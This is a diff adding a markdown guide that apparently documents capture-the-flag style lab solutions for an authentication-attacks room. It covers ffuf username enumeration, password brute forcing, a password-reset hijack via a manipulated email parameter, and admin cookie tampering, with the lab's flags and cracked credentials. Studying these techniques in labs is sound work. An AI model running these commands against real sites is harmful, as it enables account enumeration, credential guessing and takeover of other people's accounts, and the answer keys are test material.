@@ -1,0 +1,176 @@
+
+3. **Steps for Each Lab**:
+
+#### Lab 1: Username Enumeration
+
+**Folder**: `Lab1-UsernameEnumeration`
+
+**README.md**:
+```markdown
+# Lab 1: Username Enumeration
+
+## Objective
+Identify valid usernames on the Acme IT Support website using the `ffuf` tool.
+
+## Steps
+
+### 1. Setup
+Start the machine and navigate to the signup page:
+```
+http://MACHINE_IP/customers/signup
+```
+
+### 2. Use `ffuf` for Enumeration
+Run the following command:
+```sh
+ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" 
+-H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists"
+```
+**Explanation**:
+- `-w`: Specifies the wordlist.
+- `-X POST`: Sets the HTTP request method to POST.
+- `-d`: Specifies the data sent in the POST request.
+- `-H`: Sets the content type.
+- `-u`: URL of the signup form.
+- `-mr`: Response text to identify valid usernames.
+
+### 3. Results
+- Valid usernames found: `simon`, `steve`, `robert`.
+
+## Notes
+- Use the `valid_usernames.txt` file for future tasks.
+```
+
+#### Lab 2: Brute Force Attack
+
+**Folder**: `Lab2-BruteForce`
+
+**README.md**:
+```markdown
+# Lab 2: Brute Force Attack
+
+## Objective
+Perform a brute force attack on the login page using valid usernames.
+
+## Steps
+
+### 1. Setup
+Ensure you have the `valid_usernames.txt` file from Lab 1.
+
+### 2. Use `ffuf` for Brute Forcing
+Run the following command:
+```sh
+ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" 
+-H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc 200
+```
+**Explanation**:
+- `-w`: Specifies two wordlists for usernames (W1) and passwords (W2).
+- `-X POST`: Sets the HTTP request method to POST.
+- `-d`: Specifies the data sent in the POST request.
+- `-H`: Sets the content type.
+- `-u`: URL of the login form.
+- `-fc 200`: Filters out responses with HTTP status code 200 (failed login attempts).
+
+### 3. Results
+- Valid username and password: `steve/thunder`.
+
+## Notes
+- Clean the output if necessary for use in future tasks.
+```
+
+#### Lab 3: Logic Flaw Exploitation
+
+**Folder**: `Lab3-LogicFlaw`
+
+**README.md**:
+```markdown
+# Lab 3: Logic Flaw Exploitation
+
+## Objective
+Exploit a logic flaw in the password reset functionality.
+
+## Steps
+
+### 1. Setup
+Navigate to the password reset page:
+```
+http://MACHINE_IP/customers/reset
+```
+
+### 2. Initial Reset Request
+Run the following command:
+```sh
+curl 'http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
+```
+**Explanation**:
+- Sends a POST request with the email and username.
+
+### 3. Exploit Logic Flaw
+Run the following command with your email:
+```sh
+curl 'http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm' -H 
+'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={your_username}@customer.acmeitsupport.thm'
+```
+**Explanation**:
+- Manipulates the email parameter to redirect the password reset link.
+
+### 4. Results
+- Access Robert's account and retrieve the flag: `THM{AUTH_BYPASS_COMPLETE}`.
+
+## Notes
+- Ensure to create an account to get your email format for the exploit.
+```
+
+#### Lab 4: Cookie Tampering
+
+**Folder**: `Lab4-CookieTampering`
+
+**README.md**:
+```markdown
+# Lab 4: Cookie Tampering
+
+## Objective
+Modify cookie values to gain elevated privileges.
+
+## Steps
+
+### 1. Initial Request
+Run the following command:
+```sh
+curl http://MACHINE_IP/cookie-test
+```
+**Explanation**:
+- Sends a simple GET request to the URL to see the initial response.
+
+### 2. Set Logged In Cookie
+Run the following command:
+```sh
+curl -H "Cookie: logged_in=true; admin=false" http://MACHINE_IP/cookie-test
+```
+**Explanation**:
+- Sets the cookies `logged_in` to `true` and `admin` to `false`.
+
+### 3. Set Admin Cookie
+Run the following command:
+```sh
+curl -H "Cookie: logged_in=true; admin=true" http://MACHINE_IP/cookie-test
+```
+**Explanation**:
+- Sets the cookies `logged_in` to `true` and `admin` to `true`.
+
+### 4. Results
+- Retrieve the flag: `THM{COOKIE_TAMPERING}`.
+
+## Notes
+- Understand how cookies are used and manipulated for this task.
+```
+
+### Additional Tools
+
+- **Hash Cracking**: [CrackStation](https://crackstation.net/)
+- **Base64 Encoding/Decoding**: [Base64 Decode](https://www.base64decode.org/)
+
+### Conclusion
+
+By organizing your labs in a structured format and providing detailed explanations for each command, 
+you'll create a valuable resource for yourself and others. This approach will help newcomers understand the tasks and follow along easily.
